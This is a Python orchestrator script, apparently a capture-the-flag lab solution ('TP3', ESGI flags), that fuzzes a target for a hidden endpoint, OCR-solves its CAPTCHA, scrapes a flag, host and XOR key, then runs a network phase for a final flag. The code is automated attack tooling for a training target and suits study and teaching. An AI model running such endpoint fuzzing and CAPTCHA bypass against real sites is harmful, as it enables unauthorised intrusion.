"""
main.py — TP3 orchestrator: web phase → network phase → flags.
"""

from __future__ import annotations

import argparse
import logging
import re
import sys
from typing import Tuple
from urllib.parse import urljoin, urlparse

import requests

from tp3.utils.captcha import solve_captcha
from tp3.utils.fuzzer import find_hidden_endpoint, load_wordlist
from tp3.utils.netclient import run_rounds

USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)
TIMEOUT = 8
FLAG_RE = re.compile(r"(ESGI\{[^}]+\})")


def parse_args() -> argparse.Namespace:
    """Parse CLI arguments. ``--target`` is mandatory."""
    parser = argparse.ArgumentParser(
        description="TP3 exploit — Breach the target",
    )
    parser.add_argument(
        "--target",
        required=True,
        help="Base URL of the web target (e.g. http://localhost:8080)",
    )
    return parser.parse_args()


def setup_logging() -> logging.Logger:
    """Configure and return the module logger (no print)."""
    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        stream=sys.stdout,
    )
    return logging.getLogger("tp3")


def _extract_flag1_and_meta(html: str) -> Tuple[str, str, bytes]:
    """Parse flag1, host:port and XOR key from the post-CAPTCHA page."""
    flag_m = FLAG_RE.search(html)
    if not flag_m:
        raise RuntimeError("flag1 not found in CAPTCHA response")

    flag1 = flag_m.group(1)

    # host:port
    hp_m = re.search(
        r"(?:host|server|target|tcp)[^\n:]*?"
        r"(\d{1,3}(?:\.\d{1,3}){3}:\d+|localhost:\d+|127\.0\.0\.1:\d+)",
        html,
        re.I,
    )
    if not hp_m:
        hp_m = re.search(
            r"((?:localhost|127\.0\.0\.1|\d{1,3}(?:\.\d{1,3}){3}):\d+)",
            html,
        )
    if not hp_m:
        raise RuntimeError("host:port not found in CAPTCHA response")
    hostport = hp_m.group(1)

    # XOR key
    key_m = re.search(
        r"(?:key|secret|xor|encoding)[^\n:]*?([A-Za-z0-9+/=]{4,})",
        html,
        re.I,
    )
    if not key_m:
        key_m = re.search(
            r"key\s*[:=]\s*['\"]?([A-Za-z0-9+/=]+)['\"]?",
            html,
            re.I,
        )
    if not key_m:
        raise RuntimeError("encoding key not found in CAPTCHA response")
    key = key_m.group(1).encode("utf-8")

    return flag1, hostport, key


def _solve_web_phase(base_url: str, endpoint: str, log: logging.Logger) -> Tuple[str, str, bytes]:
    """Hit the hidden page, solve CAPTCHA, return flag1 + hostport + key."""
    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})

    page_url = urljoin(base_url.rstrip("/") + "/", endpoint.lstrip("/"))
    log.info("[*] Fetching hidden page: %s", page_url)
    resp = session.get(page_url, timeout=TIMEOUT)
    resp.raise_for_status()
    html = resp.text

    # Locate CAPTCHA image
    img_m = re.search(
        r'<img[^>]+src=["\']([^"\']*(?:captcha|challenge|verify)[^"\']*)["\']',
        html,
        re.I,
    )
    if not img_m:
        img_m = re.search(r'<img[^>]+src=["\']([^"\']+)["\']', html, re.I)
    if not img_m:
        raise RuntimeError("CAPTCHA image not found on page")

    img_url = urljoin(page_url, img_m.group(1))
    img_resp = session.get(img_url, timeout=TIMEOUT)
    img_resp.raise_for_status()

    captcha_text = solve_captcha(img_resp.content)
    log.info("[*] CAPTCHA OCR: %s", captcha_text)

    # Submit form
    form_m = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
    action = form_m.group(1) if form_m else page_url
    action_url = urljoin(page_url, action)

    field = "captcha"
    for name in ("captcha", "code", "answer", "solution", "response", "verify"):
        if re.search(rf'name=["\']{name}["\']', html, re.I):
            field = name
            break

    data = {field: captcha_text}
    for hidden in re.finditer(
        r'<input[^>]+type=["\']hidden["\'][^>]*'
        r'name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
        html,
        re.I,
    ):
        data[hidden.group(1)] = hidden.group(2)

    post = session.post(action_url, data=data, timeout=TIMEOUT, allow_redirects=True)
    post.raise_for_status()
    return _extract_flag1_and_meta(post.text)


def main() -> None:
    """Orchestrate the full exploit chain."""
    args = parse_args()
    log = setup_logging()

    target = args.target.rstrip("/")
    log.info("[*] Target: %s", target)

    # 1. Fuzz
    words = load_wordlist()
    endpoint = find_hidden_endpoint(target, words)
    if not endpoint:
        log.error("[-] Hidden endpoint not found")
        sys.exit(1)
    log.info("[+] Hidden endpoint: %s", endpoint)

    # 2. CAPTCHA → flag1 + meta
    flag1, hostport, key = _solve_web_phase(target, endpoint, log)
    log.info("[+] FLAG1: %s", flag1)
    log.info("[*] Network target: %s", hostport)

    # Rewrite localhost to the web-target host when needed
    parsed = urlparse(target)
    if hostport.startswith(("localhost:", "127.0.0.1:")):
        remote_host = parsed.hostname or "localhost"
        port = hostport.rsplit(":", 1)[-1]
        hostport = f"{remote_host}:{port}"
        log.info("[*] Rewrote network target → %s", hostport)

    host, port_s = hostport.rsplit(":", 1)
    port = int(port_s)

    # 3. Network phase → final flag
    final = run_rounds(host, port, key)
    log.info("[+] FLAG_FINAL: %s", final)


if __name__ == "__main__":
    main()
